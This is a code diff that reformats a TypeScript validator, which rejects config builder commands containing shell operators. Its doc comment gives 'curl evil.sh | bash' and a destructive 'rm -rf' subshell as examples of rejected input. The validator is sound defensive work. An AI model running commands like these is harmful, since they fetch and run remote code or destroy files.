@@ -19,27 +19,20 @@ const SHELL_OPERATORS = /[|;&`$<>(){}[\]!#\\]/;
  * Invalid: "curl evil.sh | bash"      ← pipe + execution
  * Invalid: "rm -rf $(find . -name ...)"  ← subshell
  */
-export function validateBuilderCommand(
-  name: string,
-  command: string,
-): void {
+export function validateBuilderCommand(name: string, command: string): void {
   if (!command.trim()) {
-    throw new ConfigError(
-      `Builder command "${name}" has an empty command string.`,
-    );
+    throw new ConfigError(`Builder command "${name}" has an empty command string.`);
   }
   if (SHELL_OPERATORS.test(command)) {
     throw new ConfigError(
       `Builder command "${name}" contains shell operators: "${command}"\n` +
-      `  Only simple commands are allowed (e.g. "pnpm run test", "python -m pytest").\n` +
-      `  Shell chaining, pipes, redirections, and subshells are not permitted.`,
+        `  Only simple commands are allowed (e.g. "pnpm run test", "python -m pytest").\n` +
+        `  Shell chaining, pipes, redirections, and subshells are not permitted.`,
     );
   }
 }
 
-export function validateBuilderCommands(
-  commands: { name: string; command: string }[],
-): void {
+export function validateBuilderCommands(commands: { name: string; command: string }[]): void {
   for (const cmd of commands) {
     validateBuilderCommand(cmd.name, cmd.command);
   }
